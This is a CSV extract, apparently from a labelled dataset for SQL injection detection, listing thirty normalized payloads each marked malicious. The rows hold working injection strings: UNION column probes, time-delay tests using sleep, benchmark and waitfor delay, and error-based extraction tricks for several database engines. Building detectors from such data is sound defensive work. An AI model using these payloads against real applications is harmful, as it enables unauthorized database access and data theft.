row_index,payload_norm,label,sqli_type_hint
8520,"end and ""xlvn"" = ""xlvn",1,
8521,"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'istb' = 'istb",1,
8522,"1' ) ) as mxxd where 7255 = 7255 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
8523,1%' ) order by 1#,1,
8524,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) -- kvkk",1,
8525,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1,
8526,"1 ) union all select null,null,null,null,null,null,null,null,null#",1,
8527,1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'fdbm' like 'fdbm,1,
8528,"1"" ) union all select null,null,null,null,null,null#",1,
8529,"1%"" ) ) and 7358 = 6986--",1,
8530,"iif ( 1149 = 4765,1,1/0 )",1,
8531,"1' in boolean mode ) union all select null,null,null,null,null#",1,
8532,select ( case when ( 6804 = 7050 ) then 6804 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
8533,1' ) ) rlike sleep ( 5 ) #,1,
8534,"1 ) as agex where 8167 = 8167 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,
8535,"-5292' ) union all select 1439,1439,1439,1439#",1,
8536,"1' where 4358 = 4358 union all select null,null,null,null--",1,
8537,"1%"" ) ) ) union all select null,null#",1,
8538,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'jmjw' like 'jmjw",1,
8539,"1 ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 5130 = 5130",1,
8540,"1%"" ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ""%"" = """,1,
8541,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,
8542,1'+ ( select 'vddk' where 6961 = 6961,1,
8543,"-2790"" ) ) as vcvw where 6075 = 6075 or 7078 = 8148--",1,
8544,"1'|| ( select 'dukt' where 3206 = 3206 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) ||'",1,
8545,1 where 6500 = 6500,1,
8546,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'zdkn' = 'zdkn",1,
8547,1%' ) ) waitfor delay '0:0:5'--,1,
8548,"-7138"" union all select 2341,2341,2341,2341--",1,
8549,1'+ ( select wpbj where 1849 = 1849,1,
